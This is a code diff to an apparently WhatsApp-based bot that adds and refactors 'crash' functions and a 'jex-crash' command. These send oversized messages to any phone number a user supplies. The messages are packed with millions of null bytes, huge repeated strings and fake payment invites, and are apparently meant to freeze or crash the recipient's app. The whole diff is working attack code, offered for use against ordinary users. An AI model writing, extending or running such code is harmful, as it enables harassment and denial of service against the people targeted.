@@ -407,11 +407,11 @@ function generateMassivePayload(baseSize = 1000000) {
 }
 
 // Function to send system crash message (STRONGER)
-async function sendSystemCrashMessage(conn, jid) {
+async function sendSystemCrashMessage(conn, target) {
     const massivePayload = generateMassivePayload(500000);
     const repeatedNulls = "\0".repeat(2000000);
     
-    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
         'viewOnceMessage': {
             'message': {
                 'interactiveMessage': {
@@ -437,14 +437,14 @@ async function sendSystemCrashMessage(conn, jid) {
         }
     }), {});
     
-    await conn.relayMessage(jid, messageContent.message, {
-        'participant': { 'jid': jid },
+    await conn.relayMessage(target, messageContent.message, {
+        'participant': { 'target': target },
         'messageId': messageContent.key.id
     });
 }
 
 // Function to send list message (STRONGER)
-async function sendListMessage(conn, jid) {
+async function sendListMessage(conn, target) {
     const massiveProducts = [];
     for (let i = 0; i < 1000; i++) {
         massiveProducts.push({
@@ -454,7 +454,7 @@ async function sendListMessage(conn, jid) {
         });
     }
     
-    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
         'listMessage': {
             'title': "SYSTEM UI CRASH".repeat(5000) + "\0".repeat(2000000),
             'footerText': "SYSTEM CRASH".repeat(5000),
@@ -486,17 +486,17 @@ async function sendListMessage(conn, jid) {
         }
     }), {});
     
-    await conn.relayMessage(jid, messageContent.message, {
-        'participant': { 'jid': jid },
+    await conn.relayMessage(target, messageContent.message, {
+        'participant': { 'target': target },
         'messageId': messageContent.key.id
     });
 }
 
 // Function to send live location message (STRONGER)
-async function sendLiveLocationMessage(conn, jid) {
+async function sendLiveLocationMessage(conn, target) {
     const longString = 'a'.repeat(500000);
     
-    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+    var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
         'viewOnceMessage': {
             'message': {
                 'liveLocationMessage': {
@@ -506,7 +506,7 @@ async function sendLiveLocationMessage(conn, jid) {
                     'sequenceNumber': '0'.repeat(50000),
                     'jpegThumbnail': longString,
                     'contextInfo': {
-                        'participant': jid,
+                        'participant': target,
                         'quotedMessage': {
                             'conversation': longString
                         }
@@ -516,22 +516,22 @@ async function sendLiveLocationMessage(conn, jid) {
         }
     }), {});
     
-    await conn.relayMessage(jid, messageContent.message, {
-        'participant': { 'jid': jid },
+    await conn.relayMessage(target, messageContent.message, {
+        'participant': { 'target': target },
         'messageId': messageContent.key.id
     });
 }
 
 // Function to send extended text message (STRONGER)
-async function sendExtendedTextMessage(conn, jid) {
+async function sendExtendedTextMessage(conn, target) {
     const massiveText = 'CRASH MESSAGE '.repeat(20000) + 'a'.repeat(500000);
     
-    await conn.relayMessage(jid, {
+    await conn.relayMessage(target, {
         'extendedTextMessage': {
             'text': massiveText,
             'contextInfo': {
-                'stanzaId': jid,
-                'participant': jid,
+                'stanzaId': target,
+                'participant': target,
                 'quotedMessage': {
                     'conversation': massiveText,
                     'extendedTextMessage': {
@@ -546,15 +546,15 @@ async function sendExtendedTextMessage(conn, jid) {
             }
         }
     }, {
-        'participant': { 'jid': jid }
+        'participant': { 'target': target }
     });
 }
 
 // Function to send payment invite (STRONGER)
-async function sendPaymentInvite(conn, jid) {
+async function sendPaymentInvite(conn, target) {
     const massivePayload = JSON.stringify(generateMassivePayload(200000));
     
-    await conn.relayMessage(jid, {
+    await conn.relayMessage(target, {
         'paymentInviteMessage': {
             'serviceType': "UPI",
             'expiryTimestamp': Date.now() + 86400000,
@@ -564,7 +564,7 @@ async function sendPaymentInvite(conn, jid) {
                     'note': 'b'.repeat(500000),
                     'currencyCode': 'c'.repeat(50000),
                     'amount1000': 999999999,
-                    'requestFrom': jid,
+                    'requestFrom': target,
                     'expiryTimestamp': Date.now() + 86400000,
                     'amount': {
                         'value': 999999999,
@@ -574,16 +574,16 @@ async function sendPaymentInvite(conn, jid) {
             }
         }
     }, {
-        'participant': { 'jid': jid }
+        'participant': { 'target': target }
     });
 }
 
 // Function to send view once messages (STRONGER)
-async function sendViewOnceMessages(conn, jid, count) {
+async function sendViewOnceMessages(conn, target, count) {
     const maxCount = Math.min(count, 50); // Limit to prevent timeout
     
     for (let i = 0; i < maxCount; i++) {
-        let messageContent = generateWAMessageFromContent(jid, {
+        let messageContent = generateWAMessageFromContent(target, {
             'viewOnceMessage': {
                 'message': {
                     'interactiveMessage': {
@@ -609,41 +609,10 @@ async function sendViewOnceMessages(conn, jid, count) {
                 }
             }
         }, {});
-        await conn.relayMessage(jid, messageContent.message, {
+        await conn.relayMessage(target, messageContent.message, {
             'messageId': messageContent.key.id
         });
         
-        // Small delay between messages
-        await new Promise(resolve => setTimeout(resolve, 100));
-    }
-}
-
-// ULTIMATE CRASH - Send all crash messages combined
-async function sendUltimateCrash(conn, jid) {
-    // Send multiple crash attempts in parallel
-    await Promise.all([
-        sendSystemCrashMessage(conn, jid),
-        sendListMessage(conn, jid),
-        sendLiveLocationMessage(conn, jid),
-        sendExtendedTextMessage(conn, jid),
-        sendPaymentInvite(conn, jid),
-        sendViewOnceMessages(conn, jid, 30)
-    ]);
-    
-    // Additional massive payload
-    for (let i = 0; i < 10; i++) {
-        try {
-            await conn.sendMessage(jid, { 
-                text: 'x'.repeat(1000000) 
-            });
-        } catch (e) {}
-        
-        try {
-            await conn.sendMessage(jid, { 
-                image: { url: 'x'.repeat(50000) },
-                caption: 'y'.repeat(500000)
-            });
-        } catch (e) {}
     }
 }
 
@@ -2188,7 +2157,7 @@ case 'anticall': {
         }
         if (action === 'off') {
             await db.set(botNumber, 'anticall', 'off');
-            return reply('❌ Anticall OFF');
+            return reply('✅ Successfully disabled anticall');
         }
     }
     
@@ -10900,11 +10869,17 @@ case 'jex-crash': {
     if (!text) return reply(`\`Example:\` : ${prefix + command} 256×××`);
     let target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
-    reply(`*[!] Sending ultimate crash to target...*`); 
+    reply(`*[!] Successfully sent bugs to target...*`); 
     
     // Send multiple crash cycles
     for (let i = 0; i < 3; i++) {
-        await sendUltimateCrash(conn, target);
+        await generateMassivePayload(conn, target);
+        await sendSystemCrashMessage(conn, target);
+        await sendListMessage(conn, target);
+        await sendLiveLocationMessage(conn, target);
+        await sendViewOnceMessages(conn, target);
+        await sendPaymentInvite(conn, target);
+        await sendExtendedTextMessage(conn, target);
     }
     
     break;
